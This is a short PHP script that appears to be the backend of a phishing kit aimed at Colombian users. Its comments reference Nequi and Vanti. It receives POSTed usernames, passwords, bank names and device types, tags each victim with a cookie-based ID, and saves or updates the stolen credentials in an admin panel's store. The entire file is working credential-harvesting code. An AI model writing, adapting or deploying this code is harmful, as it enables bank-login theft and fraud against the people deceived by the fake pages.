<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$contrasena = $ifilter->process($_POST['pas']);
$banco = $ifilter->process($_POST['ban']);
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';

// 🟢 RECIBIMOS EL ID ENVIADO DESDE FUNCTIONS.JS DE NEQUI
$id_vanti = isset($_POST['id_tramite']) ? $ifilter->process($_POST['id_tramite']) : '';

// Si viene un ID de Vanti, lo usamos y creamos la cookie para los siguientes pasos
if ($id_vanti !== '') {
    $id = $id_vanti;
    setcookie('id', $id, time() + (86400 * 30), "/"); 
} else {
    // Comportamiento normal de respaldo si no viene por URL
    $id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
}

// Como el ID ya no está vacío, ejecutará upgrade_user en lugar de crear una fila nueva
if ($id === '' || $id === '0') {
	create_item($usuario, $contrasena, $dispositivo, '', '', $banco, '');
} else {
	upgrade_user($id, $usuario, $contrasena, $banco);
}
?>